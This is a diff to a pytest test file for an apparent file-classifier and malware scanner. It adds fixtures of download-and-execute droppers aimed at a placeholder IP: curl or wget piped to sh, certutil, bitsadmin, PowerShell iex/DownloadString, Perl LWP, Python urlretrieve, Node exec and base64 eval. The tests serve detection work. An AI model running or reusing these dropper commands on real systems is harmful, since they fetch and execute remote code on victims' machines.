@@ -50,6 +50,54 @@ REVIEWED = {
     ),
 }
 
+URL = b"http://192.0.2.1/a"
+# The second review round: droppers dressed as a page whose first line `<p x` is a failed shell
+# redirect, shell and PowerShell scripts whose `let` and `function` lines look like JavaScript,
+# Node that loads a module from base64 text, and code built from base64 text.
+REVIEWED_AGAIN = {
+    "page then python urlretrieve": (
+        b"<p x\npython3 -c \"import urllib.request as r;r.urlretrieve('" + URL + b"','/run/a')\"\n"
+        b"sh /run/a\n"
+    ),
+    "page then perl lwp": b"<p x\nperl -MLWP::Simple -e 'getstore(\"" + URL + b'","/run/a")\'\n',
+    "page then eval of base64": b'<p x\neval "$(echo d2dldCBodHRwOi8v | base64 -d)"\n',
+    "page then curl": b"<p x\ncurl -o /run/a " + URL + b"\nsh /run/a\n",
+    "page then wget to a shell": b"<p x\nwget -O- " + URL + b" | sh\n",
+    "page then ftpget": b"<p x\nftpget 192.0.2.1 a a\ncat a >x\n./x\n",
+    "page then certutil": b"<p x\ncertutil -urlcache -split -f " + URL + b".exe %TEMP%\\a.exe\n",
+    "page then bitsadmin": b"<p x\nbitsadmin /transfer j " + URL + b".exe %TEMP%\\a.exe\n",
+    "page then iex": b"<p x\niex (New-Object Net.WebClient).DownloadString('" + URL + b".ps1')\n",
+    "shell with let lines": (
+        b"let a=1\nlet b=2\npython3 -c \"import urllib.request as r;r.urlretrieve('"
+        + URL
+        + b"','/run/a')\"\n"
+    ),
+    "shell with function lines": (
+        b"function dl() { python3 -c \"import urllib.request as r;r.urlretrieve('$1','$2')\"; }\n"
+        b'function run() { sh "$1"; }\ndl ' + URL + b" /run/a\nrun /run/a\n"
+    ),
+    "powershell functions": (
+        b'function Get-P($u) { (New-Object Net.WebClient).DownloadFile($u, "$env:TEMP\\a.exe") }\n'
+        b'function Run-P() { Start-Process "$env:TEMP\\a.exe" }\nGet-P \'' + URL + b".exe'\nRun-P\n"
+    ),
+    "powershell iex of base64": (
+        b"function a($x){ iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))) }\n"
+        b"function b(){ a 'aWV4' }\nb\n"
+    ),
+    "node exec on a module named in base64": (
+        b'const h=require("https");const fs=require("fs");h.get("' + URL + b'",r=>r.pipe('
+        b'fs.createWriteStream("/run/a")).on("finish",()=>require(Buffer.from('
+        b'"Y2hpbGRfcHJvY2Vzcw==","base64").toString()).exec("sh /run/a")));'
+    ),
+    "function built from atob": b'var p="d2dldCBodHRwOi8v";var f=Function;f(atob(p))();',
+    "function of atob, strict": b'"use strict";var p="d2dldA==";var x=function(){};Function(atob(p))();',
+    "eval of atob, strict": b'"use strict";var p="d2dldA==";var x=function(){};eval(atob(p));',
+    "aliased function, strict": b'"use strict";var p="d2dldA==";var f=Function;f(atob(p))();',
+    "node exec with no other sign": (
+        b'"use strict";const m=require(process.argv[2]);const f=()=>m.exec("id");f();'
+    ),
+}
+
 # Payloads that need no particular word in common, wrapped in each disguise below.
 PAYLOADS = {
     "shell dropper": DROPPER,
@@ -62,6 +110,29 @@ PAYLOADS = {
     "node chmod": b'fs.chmodSync("/tmp/a", 0o755)',
     "wsh": b'new ActiveXObject("WScript.Shell").Run("calc")',
     "perl": b'my $x = "id"; system($x);',
+    # Second round: one payload per new sign, each alone.
+    "certutil": b"certutil -urlcache -f " + URL + b" a.exe",
+    "bitsadmin": b"bitsadmin /transfer j " + URL + b" a.exe",
+    "iex": b"iex $x",
+    "invoke-expression": b"Invoke-Expression $x",
+    "invoke-webrequest": b"Invoke-WebRequest -Uri " + URL,
+    "downloadstring": b"$w.DownloadString('" + URL + b"')",
+    "downloadfile": b"$w.DownloadFile('" + URL + b"', 'a.exe')",
+    "frombase64string": b"[Convert]::FromBase64String($x)",
+    "net.webclient": b"$w = New-Object System.Net.WebClient",
+    "start-process": b"Start-Process a.exe",
+    "base64 -d": b"echo aGk= | base64 -d > /run/a",
+    "shell eval": b'eval "$x"',
+    "python -c": b"python -c 'print(1)'",
+    "python3 -c": b"python3 -c 'print(1)'",
+    "perl -e": b"perl -e 'print 1'",
+    "perl -M": b"perl -MIO::Socket -e 1",
+    "ftpget": b"ftpget 192.0.2.1 a a",
+    "urlretrieve": b"urllib.request.urlretrieve(u, p)",
+    "lwp": b"use LWP::Simple; getstore(u, p);",
+    "node exec": b"require(m).exec(c)",
+    "createwritestream": b'r.pipe(fs.createWriteStream("/run/a"))',
+    "function(atob": b"Function(atob(p))()",
 }
 DISGUISES = {
     "html": b"<!doctype html><html><head><title>t</title></head><body>hi</body></html>\n",
@@ -77,6 +148,18 @@ DISGUISES = {
 @pytest.mark.parametrize("name", sorted(REVIEWED))
 def test_reviewed_cases_keep_a_non_web_kind(name: str) -> None:
     assert identify(REVIEWED[name]).kind not in WEB_KINDS
+
+
+@pytest.mark.parametrize("name", sorted(REVIEWED_AGAIN))
+def test_second_round_cases_keep_a_non_web_kind(name: str) -> None:
+    assert identify(REVIEWED_AGAIN[name]).kind not in WEB_KINDS, name
+
+
+@pytest.mark.parametrize("name", sorted(REVIEWED_AGAIN))
+def test_second_round_cases_keep_their_links(name: str, rules: CompiledRules) -> None:
+    result = analyze(REVIEWED_AGAIN[name], rules=rules)
+    assert result.file.kind not in WEB_KINDS
+    assert result.severity != "info"
 
 
 @pytest.mark.parametrize("payload", sorted(PAYLOADS))
@@ -213,6 +296,44 @@ def test_markup_must_open_like_a_document() -> None:
         b"<!-- never closed <html><body>",
     ):
         assert identify(bad).kind not in WEB_KINDS, bad
+
+
+def test_javascript_needs_a_token_only_javascript_has() -> None:
+    # Two JavaScript markers (`let x=`, `function f(`) but nothing only JavaScript has: a shell or
+    # PowerShell script, never the `javascript` kind, even with no command in it.
+    for script in (
+        b"let a=1\nlet b=2\necho $a $b\n",
+        b"function f() { echo a; }\nfunction g() { echo b; }\nf\ng\n",
+        b"function a($x){ $x }\nfunction b(){ a 1 }\nb\n",
+        b"var a = 1\nvar b = 2\n",
+    ):
+        assert identify(script).kind != "javascript", script
+    for js in (
+        b"let a=1;let b=2;const f=(x)=>x;",
+        b"var a=1;function f(){return a===1}",
+        b"var a=1;function F(){};F.prototype.x=1;",
+        b"var a=1;function f(){return document.title}",
+        b"var a=1;var b=2;module.exports=a;",
+        b"'use strict';var a=1;var b=2;",
+        b'import a from "./a.js";export default a;',
+        b'import{a as b}from"./x.js";const c=function(){return b};export const d=2;',
+    ):
+        assert identify(js).kind == "javascript", js
+
+
+def test_the_regular_expression_exec_of_a_page_is_not_a_command() -> None:
+    bundle = (
+        b'"use strict";var r=/(\\d+)\\.(\\d+)/;function v(e){var t=r.exec(e);return t&&t[1]}'
+        b'window.v=v;var m=require("./local.js");module.exports={v:v,m:m};'
+    )
+    assert identify(bundle).kind == "javascript"
+    page = (
+        b"<!doctype html><html><body><script>var m=/x/.exec(location.hash);</script></body></html>"
+    )
+    assert identify(page).kind == "html"
+    # The same call next to a Node module load is a command.
+    for load in (b'require("child"+x)', b'require("fs")', b"import(m)", b"process.mainModule"):
+        assert identify(bundle + b"var z=" + load + b";").kind not in WEB_KINDS, load
 
 
 def test_other_languages_that_share_a_few_words_with_javascript() -> None:
